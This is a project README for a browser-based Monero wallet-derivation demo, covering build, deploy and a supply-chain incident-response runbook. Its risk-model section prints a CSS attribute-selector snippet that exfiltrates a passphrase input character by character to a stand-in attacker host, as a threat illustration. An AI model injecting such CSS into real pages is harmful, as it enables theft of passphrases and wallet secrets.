# mind-wallet — portfolio demo

The static page served at <https://mind-wallet.mstratsec.biz/> runs the
mind-wallet Argon2id → ed25519 → Monero address derivation pipeline
entirely in the browser via WebAssembly. The CLI binary remains the
canonical tool for real wallets; this page exists to make the project
legible.

## Layout

| Path                 | Purpose                                                                                    |
|----------------------|--------------------------------------------------------------------------------------------|
| `index.html`         | Two-pane layout, walkthrough card scaffolding, brand-link order (local fallback then live) |
| `mind-wallet.css`    | Page styles + fallback `:root` mirroring `mstratsec.biz/tokens.css`                         |
| `main.js`            | Hand-written ES module that drives the form, walkthrough animation, QR rendering           |
| `CNAME`              | GitHub Pages custom-domain marker (`mind-wallet.mstratsec.biz`)                            |
| `pkg/`               | `wasm-pack` / `wasm-bindgen` output. Generated, not checked in.                            |

`web/main.js` is the only hand-written JavaScript — `pkg/mind_wallet.js`
is `wasm-bindgen`-generated glue and is allowed to call `fetch()` to
load the `.wasm` artifact on init.

## Build (devshell)

```bash
nix develop
wasm-pack build --target web --features wasm
rm -rf web/pkg && mv pkg web/pkg
python3 -m http.server -d web
# open http://localhost:8000/
```

## Build (nix derivation, sandbox-friendly)

```bash
nix build .#mind-wallet-wasm
# Output at result/pkg/{mind_wallet.js, mind_wallet_bg.wasm, ...}
```

The nix path is what the GitHub Actions workflow uses, so this is the
deploy-equivalent build.

## Deploy

The `deploy-pages.yml` workflow runs on every push to `master`:

1. Build the WASM artifact via `wasm-pack`.
2. Best-effort `wasm-opt -Oz` the binary.
3. Substitute `build-sha` in `index.html` via `sed` + verify with `grep -q`.
4. Grep-gate `main.js` for zero-network calls.
5. Copy `web/` to `_site/`, assert `_site/CNAME` exists with the expected hostname.
6. Upload + deploy via `actions/upload-pages-artifact` + `actions/deploy-pages`.

### First-deploy setup (out-of-band)

These are one-time manual actions and are NOT idempotent in CI:

1. **DNS:** add `CNAME mind-wallet.mstratsec.biz → quentinmallet.github.io.`
   at the registrar managing `mstratsec.biz`.
2. **GitHub Pages Settings:** Source = "GitHub Actions"; Custom domain =
   `mind-wallet.mstratsec.biz`; wait for the cert to provision; enable
   "Enforce HTTPS".
3. **First-deploy permissions:** if the `deploy` job fails on the first
   push, confirm that the `github-pages` environment exists under
   Settings → Environments and that `id-token: write` is granted to the
   workflow.

## Supply-chain takedown

### Risk model

`index.html` links the cross-origin stylesheet `https://mstratsec.biz/tokens.css`
so brand updates auto-propagate. The trade-off: a compromise of the
`mstratsec.biz` static-asset host would let an attacker inject arbitrary
CSS into the demo page. CSS attribute selectors can exfiltrate input
values one character at a time:

```css
input[value^="a"] { background: url(//attacker.example/a); }
input[value^="aa"] { background: url(//attacker.example/aa); }
```

The page contains a passphrase input, so this is a realistic
exfiltration channel even though the page itself never serializes
secrets over the network. The demo accepts the trade-off (auto-
propagating brand vs. supply-chain risk) but treats the host's
operational hygiene as load-bearing.

### Who can take it down

- **Repo owner** (only person able to act):
  - Disable the GitHub Pages source under Settings → Pages → Source = None.
  - Push a commit that removes the `<link>` to `mstratsec.biz/tokens.css`.

- **Registrar DNS pull:** removing the `CNAME` record at the registrar
  effectively breaks the live URL (5-minute TTL recommended for fast
  rollback).

### Step-by-step takedown

1. **Stop serving the page:**

   ```text
   GitHub → Settings → Pages → Source = "None"
   ```

   Pages drops the deployment immediately.

2. **Remove the link from source so a future redeploy is clean:**

   ```bash
   # remove the tokens.css <link> from index.html
   sed -i '/mstratsec\.biz\/tokens\.css/d' web/index.html
   git commit -am "fix(web): drop cross-origin tokens.css link (incident response)"
   git push
   ```

3. **Wait for the redeploy, then verify:**

   ```bash
   curl -s https://mind-wallet.mstratsec.biz/ \
     | grep -c 'mstratsec\.biz/tokens\.css'
   # → 0
   ```

   If non-zero, the deploy did not take; repeat step 2.

4. **Document the incident** in `.omc/incidents/` (date, scope, observed
   IOCs, time-to-take-down) and post a public note from the canonical
   site once the source host is known clean.

### References

- GitHub Pages — disabling a site: <https://docs.github.com/en/pages/getting-started-with-github-pages/unpublishing-a-github-pages-site>
- GitHub Pages — custom domains: <https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site>
